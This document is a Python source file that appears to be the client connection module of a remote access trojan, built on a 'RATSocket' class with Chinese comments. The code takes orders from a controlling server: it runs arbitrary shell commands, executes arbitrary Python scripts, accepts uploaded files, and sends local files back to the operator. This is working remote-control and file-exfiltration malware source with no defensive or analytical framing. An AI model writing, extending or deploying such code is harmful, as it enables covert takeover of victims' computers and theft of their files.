import json
import ntpath
import os

from client.command import Command
from common.ratsocket import RATSocket


class Server(RATSocket):

    def __init__(self):
        super().__init__()

    def send_result(self, status: int, result: str):
        """ 发送命令执行结果 """
        body = result.encode()
        head = {
            'type': 'result',
            'status': status,
            'length': len(body)
        }
        self.send(head, body=body)

    def send_file(self, filename: str):
        """ 发送文件 """
        head = {
            'type': 'file',
            'filename': ntpath.basename(filename),
            'length': os.stat(filename).st_size
        }
        with open(filename, 'rb') as f:
            self.send(head, f=f)

    def recv_command(self, command_handler):
        """ 接收命令 """
        # 接收消息头
        head = self.recv_head()
        # 消息类型
        type = head['type']
        # 保存文件
        if type == 'file':
            # 文件名
            filename = head['filename']
            # 打开文件
            with open(filename, 'ab') as f:
                # 清空文件内容
                f.truncate(0)
                # 接收消息主体并写入文件
                self.recv_body(head, f=f)
                # 返回保存路径
                return 1, '\nFile uploaded to: {}'.format(os.path.abspath(filename))
        else:
            # 接收消息主体
            body = self.recv_body(head)
            # 执行命令
            if type == 'command':
                return command_handler(body)
            # 执行python脚本
            elif type == 'script':
                return Command.pyexec(body, json.loads(head['args']))

    def request_file(self, filename):
        """ 向服务端索要文件 """
        body = filename.encode()
        head = {
            'type': 'file request',
            'length': len(body)
        }
        self.send(head, body=body)
        head = self.recv_head()
        if head['type'] == 'file':
            filename = head['filename']
            try:
                with open(filename, 'ab') as f:
                    f.truncate(0)
                    self.recv_body(head, f=f)
                    return True
            except Exception as e:
                _ = self.recv_body(head)
                self.send_result(0, str(e))
        else:
            _ = self.recv_body(head)
            self.send_result(0, 'Aborted')
